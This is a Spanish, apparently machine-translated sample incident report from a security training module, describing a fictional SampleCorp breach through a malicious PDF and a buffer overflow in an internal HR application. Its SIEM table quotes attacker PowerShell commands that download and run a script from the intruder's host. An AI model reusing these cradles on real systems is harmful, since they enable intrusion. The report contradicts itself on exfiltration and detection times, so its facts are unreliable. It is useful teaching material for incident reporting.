# Informe de incidentes del mundo real

# **Resumen ejecutivo**

- **`Incident ID`**: Inc2019-0422-022
- **`Incident Severity`**: Alto (P2)
- **`Incident Status`**: Resuelto
- **`Incident Overview`**: En la noche de`April 22, 2019`, en precisamente`01:05:00`, El Centro de Operaciones de Seguridad (SOC) de SampleCorp detectó una actividad no autorizada dentro de la red interna, específicamente a través del inicio del proceso anómalo y los comandos de PowerShell de aspecto sospechoso. Aprovechando la falta de controles de acceso a la red robustos y dos vulnerabilidades de seguridad, la entidad no autorizada obtuvo con éxito el control sobre los siguientes nodos dentro de la infraestructura de SampleCorp:
    - `WKST01.samplecorp.com`: Un sistema utilizado para fines de desarrollo de software.
    - `HR01.samplecorp.com`: Un sistema utilizado para procesar datos de empleados y socios.
    
    El SoC de SampleCorp, en colaboración con las unidades de Forensics y Respuesta a Incidentes (DFIR) (DFIR), logró contener con éxito la amenaza, eliminar tanto el software malicioso introducido como las brechas de seguridad existentes, y finalmente restaurar los sistemas comprometidos a su estado original.
    
- **`Key Findings`**: Debido a los controles de acceso a la red insuficientes, a la entidad no autorizada se le asignó una dirección IP interna simplemente conectando su computadora a un puerto Ethernet dentro de una oficina de SampleCorp. Los esfuerzos de investigación revelaron que la entidad no autorizada inicialmente comprometió`WKST01.samplecorp.com`explotando una versión vulnerable de`Acrobat Reader`. Además, la entidad explotó un`buffer overflow vulnerability`, esta vez en una aplicación patentada desarrollada por SampleCorp, para penetrar aún más en la red interna. Si bien no se detectó una exfiltración de datos generalizada, probablemente debido a la rápida intervención por parte de los equipos SOC y DFIR, el acceso no autorizado a ambos`WKST01.samplecorp.com`y`HR01.samplecorp.com`plantear preocupaciones. Como resultado, los datos de la Compañía y el Cliente deben considerarse como potencialmente comprometidos hasta cierto punto.
- **`Immediate Actions`**: Los equipos SOC y DFIR de SampleCorp administraron exclusivamente los procedimientos de respuesta a incidentes, sin la participación de ningún proveedor de servicios externos. Se tomaron medidas inmediatas para aislar los sistemas comprometidos de la red mediante el uso de la segmentación de VLAN. Para facilitar una investigación integral, los equipos SOC y DFIR recopilaron datos extensos. Esto incluyó obtener acceso a archivos de captura de tráfico de red. Además, todos los sistemas afectados fueron conectados a una solución de seguridad del host. En cuanto a los registros de eventos, fueron recolectados automáticamente por la solución Elástica SIEM existente.
- **`Stakeholder Impact`**:
    - `Customers`: Si bien no se identificó una extensa exfiltración de datos, el acceso no autorizado a ambos`WKST01.samplecorp.com`y`HR01.samplecorp.com`plantea preocupaciones sobre la integridad y la confidencialidad de los datos del cliente. Como medida de precaución, algunos servicios se desconectaron temporalmente y se revocaron algunas claves API, lo que llevó a breves períodos de tiempo de inactividad para los clientes. Actualmente se están evaluando las implicaciones financieras de este tiempo de inactividad, pero podrían resultar en la pérdida de ingresos y la confianza del cliente.
    - `Employees`: Los sistemas comprometidos incluidos`HR01.samplecorp.com`, que generalmente alberga información confidencial de los empleados. Aunque no tenemos evidencia para sugerir que los datos de los empleados fueron específicamente dirigidos o extraídos, el riesgo potencial permanece. Los empleados pueden estar sujetos a robo de identidad o ataques de phishing si sus datos se vieron comprometidos.
    - `Business Partners`: Dado que`WKST01.samplecorp.com`, un entorno de desarrollo, se encontraba entre los sistemas comprometidos, existe la posibilidad de que el código o la tecnología patentada pudieran haber sido expuestas. Esto podría tener ramificaciones para los socios comerciales que dependen de la integridad y exclusividad de las soluciones tecnológicas de SampleCorp.
    - `Regulatory Bodies`: La violación de los sistemas podría tener implicaciones de cumplimiento. Los organismos reguladores pueden imponer multas o sanciones a SampleCorp por no proteger adecuadamente los datos confidenciales, dependiendo de la jurisdicción y la naturaleza de los datos comprometidos.
    - `Internal Teams`: Los equipos SOC y DFIR pudieron contener la amenaza de manera efectiva, pero el incidente probablemente requerirá una revisión y una posible revisión de las medidas de seguridad actuales. Esto podría significar una reasignación de recursos y ajustes presupuestarios, impactando a otros departamentos y proyectos.
    - `Shareholders`: El incidente podría tener un impacto negativo a corto plazo en los precios de las acciones debido a la pérdida potencial de la confianza del cliente y las posibles multas regulatorias. Los efectos a largo plazo dependerán de la efectividad de las acciones correctivas tomadas y la capacidad de la Compañía para restaurar la confianza de los interesados.

# **Análisis técnico**

### **Sistemas y datos afectados**

Debido a los controles de acceso a la red insuficientes, a la entidad no autorizada se le asignó una dirección IP interna simplemente conectando su computadora a un puerto Ethernet dentro de una oficina de SampleCorp.

La entidad no autorizada obtuvo con éxito el control sobre los siguientes nodos dentro de la infraestructura de SampleCorp:

- `WKST01.samplecorp.com`: Este es un entorno de desarrollo que contiene un código fuente patentado para los próximos lanzamientos de software, así como las claves API para servicios de terceros. La entidad no autorizada navegó a través de varios directorios, lo que planteó preocupaciones sobre el robo de propiedad intelectual y el posible abuso de las claves API.
- `HR01.samplecorp.com`: Este es el sistema de recursos humanos que alberga datos confidenciales de empleados y socios, incluida la información de identificación personal, los detalles de la nómina y las revisiones de desempeño. Nuestros registros indican que la entidad no autorizada obtuvo acceso a este sistema. Lo más preocupante es que se accedió a una base de datos no certriada que contiene números de Seguro Social de los empleados y detalles de la cuenta bancaria. Si bien no tenemos evidencia para sugerir que se extrajeran datos, el riesgo potencial de robo de identidad y fraude financiero para los empleados es alto.

### **Fuentes y análisis de evidencia**

**Wkst01.samplecorp.com**

En la noche de`April 22, 2019`, exactamente`01:05:00`, El Centro de Operaciones de Seguridad (SOC) de SampleCorp identificó la actividad no autorizada dentro de la red interna. Esto se detectó a través de relaciones anormales de procesos entre padres e hijos y comandos sospechosos de PowerShell, como se muestra en la siguiente captura de pantalla.

De los registros, PowerShell fue invocado de`cmd.exe`para ejecutar el contenido de un script alojado remotamente. La dirección IP del host remoto era una dirección interna,`192.168.220.66`, indicando que una entidad no autorizada ya estaba presente dentro de la red interna.

![](https://academy.hackthebox.com/storage/modules/238/1.png)

Los primeros signos de ejecución de comandos maliciosos apuntan a`WKST01.samplecorp.com`estar comprometido, probablemente debido a un archivo adjunto de correo electrónico malicioso con un archivo sospechoso llamado`cv.pdf`Por las siguientes razones:

- El usuario accedió al cliente de correo electrónico`Mozilla Thunderbird`
- Un archivo sospechoso`cv.pdf`se abrió con Adobe Reader 10.0, que está desactualizado y vulnerable a los defectos de seguridad.
- Los comandos maliciosos se observaron inmediatamente después de estos eventos.

![](https://academy.hackthebox.com/storage/modules/238/2_.png)

Además,`cmd.exe`y`powershell.exe`fueron generados de`wmiprvse.exe`.

![](https://academy.hackthebox.com/storage/modules/238/3_.png)

![](https://academy.hackthebox.com/storage/modules/238/4.png)

Como ya se mencionó, la entidad no autorizada luego ejecutó comandos específicos de PowerShell.

![](https://academy.hackthebox.com/storage/modules/238/5.png)

**Breve análisis de 192.168.220.66**

Desde los registros, identificamos cuatro hosts en el segmento de red con las direcciones IP y los nombres de host correspondientes. El anfitrión`192.168.220.66`, previamente observado en los registros de`WKST01.samplecorp.com`, confirma la presencia de una entidad no autorizada en la red interna.

| **IP** | **Nombre de host** |
| --- | --- |
| 192.168.220.20 | Dc01.samplecorp.com |
| 192.168.220.200 | Wkst01.samplecorp.com |
| 192.168.220.101 | Hr01.samplecorp.com |
| 192.168.220.202 | Eng01.samplecorp.com |

La siguiente tabla es el resultado de una consulta SIEM que tenía como objetivo identificar todas las instancias de ejecución de comandos iniciadas desde`192.168.220.66`, basado en datos de`WKST01.samplecorp.com`.

| **event_data.commandline.keyword: descendente** | **beat.hostname.keyword: descendente** | **Contar** |
| --- | --- | --- |
| `cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\__1555864304.02 2>&1` | WKST01 | 5 |
| `cmd.exe /Q /c dir 1> \\127.0.0.1\ADMIN$\__1555864304.02 2>&1` | WKST01 | 4 |
| `powershell.exe -nop -w hidden -c $c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX` | WKST01 | 2 |
| `whoami` | WKST01 | 1 |
| `...` | ... | ... |
| `powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.220.66/test.php'); $m = Get-ModifiableService; $m` | HR01 | 1 |

Los resultados sugieren que la entidad no autorizada se ha infiltrado con éxito a los hosts:`WKST01.samplecorp.com`y`HR01.samplecorp.com`.

**Hr01.samplecorp.com**

`HR01.samplecorp.com`fue investigado a continuación, como la entidad no autorizada,`192.168.220.66`, se demostró que establece una conexión con`HR01.samplecorp.com`en el momento más temprano posible en la captura de paquetes.

![](https://academy.hackthebox.com/storage/modules/238/6.png)

Los detalles del tráfico de red sugieren un intento de desbordamiento de búfer en el servicio que se ejecuta en el puerto`31337`de`HR01.samplecorp.com`.

![](https://academy.hackthebox.com/storage/modules/238/7.png)

El tráfico de la red se exportó como binario sin procesar para un análisis posterior.

![](https://academy.hackthebox.com/storage/modules/238/8.png)

El binario extraído se analizó en un depurador de shellcode,`scdbg`.

`Scdbg`revela que el código de shell intentará iniciar una conexión a`192.168.220.66`en el puerto`4444`. Esto confirma que ha habido un intento de explotar un servicio que se ejecuta en el puerto`31337`de`HR01.samplecorp.com`.

![](https://academy.hackthebox.com/storage/modules/238/9.png)

Una búsqueda de conexiones de red entre`HR01.samplecorp.com`y la entidad no autorizada se realizó utilizando el archivo de captura de tráfico mencionado anteriormente. Los resultados revelaron conexiones a la entidad no autorizada en el puerto`4444`. Esto indica que la entidad no autorizada explotó con éxito una vuln de desbordamiento de búfer para obtener la ejecución de comandos en`HR01.samplecorp.com`.

![](https://academy.hackthebox.com/storage/modules/238/6_.png)

La profundidad del análisis técnico se puede adaptar para garantizar que todas las partes interesadas estén adecuadamente informadas sobre el incidente y las acciones tomadas en respuesta. Si bien hemos elegido mantener los detalles de la investigación concisos en este módulo para evitar abrumarlo, es importante tener en cuenta que en una situación del mundo real, cada reclamo o declaración estaría respaldado con pruebas sólidas.

### **Indicadores de compromiso (COI)**

- **`C2 IP`**: 192.168.220.66
- **`cv.pdf`**(SHA256): EF59D7038CFD565FD65BAE12588810D5361DF938244EBAD33B71882DCF683011

### **Análisis de causa raíz**

Los controles de acceso a la red insuficientes permitieron el acceso a la entidad no autorizado a la red interna de SampleCorp.

Los catalizadores primarios para el incidente se remontan a dos vulnerabilidades significativas. La primera vulnerabilidad surgió del uso continuo de una versión obsoleta de Acrobat Reader, mientras que la segunda se atribuyó a un problema de desbordamiento del amortiguador presente dentro de una aplicación patentada. Computar estas vulnerabilidades fue la segregación de red inadecuada de los sistemas cruciales, dejándolos más objetivos expuestos y más fáciles de amenazas potenciales. Además, hubo una brecha notable en la conciencia del usuario, evidente por la ausencia de capacitación integral contra las tácticas de phishing, que podría haber servido como el punto de entrada inicial para los atacantes.

### **Línea de tiempo técnico**

- Compromiso inicial
    - `April 22nd, 2019, 00:27:27`: Uno de los empleados abrió un documento PDF malicioso (`cv.pdf`) en`WKST01.samplecorp.com`, que explotó una vulnerabilidad conocida en una versión obsoleta de`Acrobat Reader`. Esto condujo a la ejecución de una carga útil maliciosa que estableció una posición inicial en el sistema.
- Movimiento lateral
    - `April 22nd, 2019, 00:50:18`: La entidad no autorizada aprovechó el acceso inicial para realizar el reconocimiento en la red interna. Descubrieron un`buffer overflow`vulnerabilidad en una aplicación de recursos humanos propietaria que se ejecuta en`HR01.samplecorp.com`. Usando una carga útil diseñada, explotaron esta vulnerabilidad para obtener acceso no autorizado al sistema de recursos humanos.
- Acceso de datos y exfiltración
    - `April 22nd, 2019, 00:35:09`: La entidad no autorizada accedió a varios directorios en`WKST01.samplecorp.com`que contiene tanto código fuente como claves API.
    - `April 22nd, 2019, 01:30:12`: La entidad no autorizada localizó una base de datos no cifrada en`HR01.samplecorp.com`que contiene datos confidenciales de empleados y socios, incluidos números de seguro social e información salarial. Comprimieron estos datos y los exfiltraron a un servidor externo a través de un seguro`SSH`túnel.
- Comunicaciones C2
    - Una entidad no autorizada obtuvo acceso físico a la red interna de SampleCorp. La dirección IP de comando y control (C2) identificada fue interna:`192.168.220.66`.
- Implementación o actividad de malware
    - El malware se difundió a través de un documento PDF malicioso y hizo un uso extensivo de binarios legítimos de Windows para la puesta en escena, la ejecución de comandos y los fines de la explotación posterior.
    - Posteriormente, el código de shell se utilizó dentro de una carga útil de desbordamiento del búfer para infectar`HR01.samplecorp.com`.
- Tiempos de contención
    - `April 22nd, 2019, 02:30:11`: Los equipos SOC y DFIR de SampleCorp detectaron las actividades no autorizadas e inmediatamente aislados`WKST01.samplecorp.com`y`HR01.samplecorp.com`de la red utilizando la segmentación de VLAN.
    - `April 22nd, 2019, 03:10:14`: Los equipos SOC y DFIR de SampleCorp conectaron una solución de seguridad de host a ambos`WKST01.samplecorp.com`y`HR01.samplecorp.com`para recopilar más datos de los sistemas afectados.
    - `April 22nd, 2019, 03:43:34`: Las reglas del firewall se actualizaron para bloquear la dirección IP C2 conocida, cortando efectivamente el acceso remoto de la entidad no autorizada.
- Tiempos de erradicación
    - `April 22nd, 2019, 04:11:00`: Se utilizó una herramienta especializada de eliminación de malware para limpiar ambos`WKST01.samplecorp.com`y`HR01.samplecorp.com`del malware desplegado.
    - `April 22nd, 2019, 04:30:00`: Todos los sistemas, comenzando con`WKST01.samplecorp.com`se actualizaron a la última versión de`Acrobat Reader`, mitigando la vulnerabilidad que condujo al compromiso inicial.
    - `April 22nd, 2019, 05:01:08`: Las claves API a las que fueron accedidas por la entidad no autorizada han sido revocadas.
    - `April 22nd, 2019, 05:05:08`: Las credenciales de inicio de sesión del usuario que accedió al`cv.pdf`archivo, así como los de los usuarios que recientemente han iniciado sesión en ambos`WKST01.samplecorp.com`y`HR01.samplecorp.com`, han sido reiniciados.
- Tiempos de recuperación
    - `April 22nd, 2019, 05:21:20`: Después de asegurarse de que`WKST01.samplecorp.com`estaba libre de malware, el equipo de SOC restauró el sistema desde una copia de seguridad verificada.
    - `April 22nd, 2019, 05:58:50`: Después de asegurarse de que`HR01.samplecorp.com`estaba libre de malware, el equipo de SOC restauró el sistema desde una copia de seguridad verificada.
    - `April 22nd, 2019, 06:33:44`: El equipo de desarrollo lanzó un parche de emergencia para el`buffer overflow`vulnerabilidad en la aplicación de recursos humanos patentada, que luego se implementó a`HR01.samplecorp.com`.

### **Naturaleza del ataque**

En este segmento, debemos diseccionar meticulosamente el modus operandi de la entidad no autorizada, arrojando luz sobre las tácticas, técnicas y procedimientos (TTP) específicos que emplearon a lo largo de su intrusión. Por ejemplo, vamos a sumergirnos en los métodos que el equipo de SOC usó para determinar que la entidad no autorizada utilizó el marco de MetaSploit en sus operaciones.

**Detección de metasploit**

Para comprender mejor las tácticas y técnicas de la entidad no autorizada, profundizamos en los comandos de PowerShell maliciosos ejecutados.

Particularmente, el que se muestra en la siguiente captura de pantalla.

![](https://academy.hackthebox.com/storage/modules/238/double_enc.png)

Tras la inspección, quedó claro que se usó doble codificación, probablemente como un medio para evitar mecanismos de detección. El equipo de SOC decodificó con éxito la carga útil maliciosa, revelando el código exacto de PowerShell ejecutado en la memoria de`WKST01.samplecorp.com`.

![](https://academy.hackthebox.com/storage/modules/238/decoded.png)

Al aprovechar la inteligencia de código abierto, nuestro equipo de SOC determinó que este código de PowerShell probablemente esté vinculado al[Metasploit](https://github.com/rapid7/metasploit-framework)Marco posterior a la explotación.

![](https://academy.hackthebox.com/storage/modules/238/meter_refl.png)

Para apoyar nuestra hipótesis de que`Metasploit`se usó, nos sumergimos más profundamente en el código de carcasa detectado. Exportamos específicamente los bytes de paquetes que contienen el código de shell (como`a.bin`) y posteriormente los presentó a Virustotal para su evaluación.

![](https://academy.hackthebox.com/storage/modules/238/packets1.png)

![](https://academy.hackthebox.com/storage/modules/238/packets2.png)

![](https://academy.hackthebox.com/storage/modules/238/packets3.png)

Los resultados de Virustotal afirmaron nuestra sospecha de que`Metasploit`estaba en juego. Ambos`metacoder`y`shikata`están intrínsecamente vinculados al código de carcasa generado por el metasploit.

---

# **Análisis de impacto**

En este segmento, debemos profundizar en el análisis inicial de impacto de las partes interesadas presentado al comienzo de este informe. Dada la estructura interna única de la compañía, el panorama comercial y las obligaciones regulatorias, es crucial ofrecer una evaluación integral de las implicaciones del incidente para cada parte afectada.

---

# **Análisis de respuesta y recuperación**

### **Acciones de respuesta inmediata**

**Revocación de acceso**

- `Identification of Compromised Accounts/Systems`: Utilizando la solución elástica de Siem, las actividades sospechosas asociadas con el acceso no autorizado se marcaron en`WKST01.samplecorp.com`. Luego, una combinación de tráfico y análisis de registro descubrió el acceso no autorizado en`HR01.samplecorp.com`también.
- `Timeframe`: Se detectaron actividades no autorizadas en`April 22, 2019, 01:05:00`. El acceso fue terminado por`April 22nd, 2019, 03:43:34`Tras la actualización de la regla del firewall para bloquear la dirección IP C2.
- `Method of Revocation`: Junto con las reglas del firewall, las políticas de Active Directory se aplicaron para forzar las sesiones de inicio de sesión de cuentas posiblemente comprometidas. Además, las credenciales de usuario afectadas se restablecieron y se revocó las claves API accionadas, inhibiendo aún más el acceso no autorizado.
- `Impact`: La revocación inmediata del acceso detuvo el movimiento lateral potencial, evitando un mayor compromiso del sistema y los intentos de exfiltración de datos.

**Estrategia de contención**

- `Short-term Containment`: Como parte de la respuesta inicial, la segmentación de VLAN se aplicó rápidamente, aislando efectivamente`WKST01.samplecorp.com`y`HR01.samplecorp.com`del resto de la red, y obstaculizando cualquier movimiento lateral por el actor de amenaza.
- `Long-term Containment`: La siguiente fase de contención implica una implementación más sólida de la segmentación de red, asegurando departamentos específicos o infraestructura crítica ejecutada en segmentos de red aislados y controles de acceso a la red sólidos, asegurando que solo los dispositivos autorizados tengan acceso a la red interna de una organización. Ambos reducirían la superficie de ataque para futuras amenazas.
- `Effectiveness`: Las estrategias de contención tuvieron éxito para garantizar que el actor de amenaza no intensificara los privilegios o se mudara a los sistemas adyacentes, lo que limita el impacto del incidente.

### **Medidas de erradicación**

**Eliminación de malware**

- `Identification`: Los procesos sospechosos fueron marcados en los sistemas comprometidos, y un examen forense de buceo profundo reveló rastros del`Metasploit`marco posterior a la explotación, que se confirmó aún más por`VirusTotal`análisis.
- `Removal Techniques`: Utilizando una herramienta especializada de eliminación de malware, todas las cargas de maliciosas identificadas fueron erradicadas de`WKST01.samplecorp.com`y`HR01.samplecorp.com`.
- `Verification`: Después de la remoción, se inició un escaneo secundario y se realizó un análisis heurístico para garantizar que no persistieran los restos del malware.

**Parcheo del sistema**

- `Vulnerability Identification`: Una instancia vulnerable de`Acrobat Reader`fue identificado, lo que condujo al compromiso inicial. La referencia cruzada con vulnerabilidades conocidas apuntó hacia una posible exploit que se utiliza. A`buffer overflow`También se identificó la vulnerabilidad, en una aplicación patentada desarrollada por SampleCorp.
- `Patch Management`: Todos los sistemas, se actualizaron rápidamente a la última versión de`Acrobat Reader`que abordó la vulnerabilidad conocida. El equipo de desarrollo lanzó un parche de emergencia para el`buffer overflow`vulnerabilidad en la aplicación de recursos humanos patentada, que luego se implementó a`HR01.samplecorp.com`. El parche se realizó de manera escenificada, con sistemas críticos priorizados.
- `Fallback Procedures`: Las instantáneas y las configuraciones del sistema se respaldaron antes del proceso de parcheo, asegurando una reversión rápida si la actualización introdujo alguna inestabilidad del sistema.

### **Pasos de recuperación**

**Restauración de datos**

- `Backup Validation`: Antes de la restauración de datos, las sumas de verificación de respaldo se verificaron cruzadas para garantizar la integridad de los datos de copia de seguridad.
- `Restoration Process`: El equipo de SOC restauró meticulosamente ambos sistemas afectados de copias de seguridad validadas.
- `Data Integrity Check`S: después de la restauración, se empleó el hash criptográfico usando SHA-256 para verificar la integridad y la autenticidad de los datos restaurados.

**Validación del sistema**

- `Security Measures`: Los firewalls y los sistemas de detección de intrusos de los sistemas se actualizaron con los últimos feeds de inteligencia de amenazas, asegurando que cualquier indicador de compromiso (COI) de este incidente desencadenaría alertas instantáneas.
- `Operational Checks`: Antes de reintroducir sistemas en el entorno en vivo, se realizó una batería de pruebas operativas, incluidas las pruebas de carga y el estrés, para confirmar la estabilidad y el rendimiento de los sistemas.

### **Acciones posteriores a la incidente**

**Escucha**

- `Enhanced Monitoring Plans`: El paradigma de monitoreo se ha renovado para incluir análisis de comportamiento, centrándose en detectar desviaciones de los comportamientos de referencia que podrían indicar compromiso. Además, las actividades de gestión de inventario y activos comenzaron a facilitar la implementación de controles de acceso a la red.
- `Tools and Technologies`: Aprovechar las capacidades del SIEM elástico existente, se implementarán reglas de correlación avanzada, diseñadas específicamente para detectar las tácticas, técnicas y procedimientos (TTP) identificados en esta violación.

**Lecciones aprendidas**

- `Gap Analysis`: El incidente arrojó luz sobre ciertas brechas, principalmente alrededor de los controles de acceso a la red, el filtrado de correo electrónico, la segregación de red y la capacitación de los usuarios sobre posibles intentos de phishing con documentos maliciosos.
- `Recommendations for Improvement`: Se priorizan las iniciativas sobre la gestión del inventario y los activos, el filtrado de correo electrónico y la capacitación mejorada de conciencia de seguridad.
- `Future Strategy`: Una estrategia prospectiva implicará controles de acceso a la red más granulares y segmentación de redes, adoptando un modelo de seguridad de confianza cero y aumentando las inversiones tanto en la capacitación en la conciencia de seguridad como en el filtrado de correo electrónico.

---

# **Anexo A**

### **Línea de tiempo técnico**

| **Tiempo** | **Actividad** |
| --- | --- |
| `April 22nd, 2019, 00:27:27` | Uno de los empleados abrió un documento PDF malicioso (`cv.pdf`) en`WKST01.samplecorp.com`, que explotó una vulnerabilidad conocida en una versión obsoleta de`Acrobat Reader`. Esto condujo a la ejecución de una carga útil maliciosa que estableció una posición inicial en el sistema. |
| `April 22nd, 2019, 00:35:09` | La entidad no autorizada accedió a varios directorios en`WKST01.samplecorp.com`que contiene tanto código fuente como claves API. |
| `April 22nd, 2019, 00:50:18` | La entidad no autorizada aprovechó el acceso inicial para realizar el reconocimiento en la red interna. Descubrieron un`buffer overflow`vulnerabilidad en una aplicación de recursos humanos propietaria que se ejecuta en`HR01.samplecorp.com`. Usando una carga útil diseñada, explotaron esta vulnerabilidad para obtener acceso no autorizado al sistema de recursos humanos. |
| `April 22nd, 2019, 01:30:12` | La entidad no autorizada ubicó una base de datos no cifrada en`HR01.samplecorp.com`que contiene datos confidenciales de empleados y socios, incluidos números de seguro social e información salarial. Comprimieron estos datos y los exfiltraron a un servidor externo a través de un seguro`SSH`túnel. |
| `April 22nd, 2019, 02:30:11` | Los equipos SOC y DFIR de SampleCorp detectaron las actividades no autorizadas e inmediatamente aislados`WKST01.samplecorp.com`y`HR01.samplecorp.com`de la red utilizando la segmentación de VLAN. |
| `April 22nd, 2019, 03:10:14` | Los equipos SOC y DFIR de SampleCorp conectaron una solución de seguridad de host a ambos`WKST01.samplecorp.com`y`HR01.samplecorp.com`para recopilar más datos de los sistemas afectados. |
| `April 22nd, 2019, 03:43:34` | Las reglas del firewall se actualizaron para bloquear la dirección IP C2 conocida, cortando efectivamente el acceso remoto de la entidad no autorizada. |
| `April 22nd, 2019, 04:11:00` | Se utilizó una herramienta especializada de eliminación de malware para limpiar ambos`WKST01.samplecorp.com`y`HR01.samplecorp.com`del malware desplegado. |
| `April 22nd, 2019, 04:30:00` | Todos los sistemas, comenzando con`WKST01.samplecorp.com`se actualizaron a la última versión de`Acrobat Reader`, mitigando la vulnerabilidad que condujo al compromiso inicial. |
| `April 22nd, 2019, 05:01:08` | Las claves API a las que fueron accedidas por la entidad no autorizada han sido revocadas. |
| `April 22nd, 2019, 05:05:08` | Las credenciales de inicio de sesión del usuario que accedió al`cv.pdf`archivo, así como los de los usuarios que recientemente han iniciado sesión en ambos`WKST01.samplecorp.com`y`HR01.samplecorp.com`, han sido reiniciados. |
| `April 22nd, 2019, 05:21:20` | Después de asegurar que`WKST01.samplecorp.com`estaba libre de malware, el equipo de SOC restauró el sistema desde una copia de seguridad verificada. |
| `April 22nd, 2019, 05:58:50` | Después de asegurar que`HR01.samplecorp.com`estaba libre de malware, el equipo de SOC restauró el sistema desde una copia de seguridad verificada. |
| `April 22nd, 2019, 06:33:44` | El equipo de desarrollo lanzó un parche de emergencia para el`buffer overflow`vulnerabilidad en la aplicación de recursos humanos patentada, que luego se implementó a`HR01.samplecorp.com`. |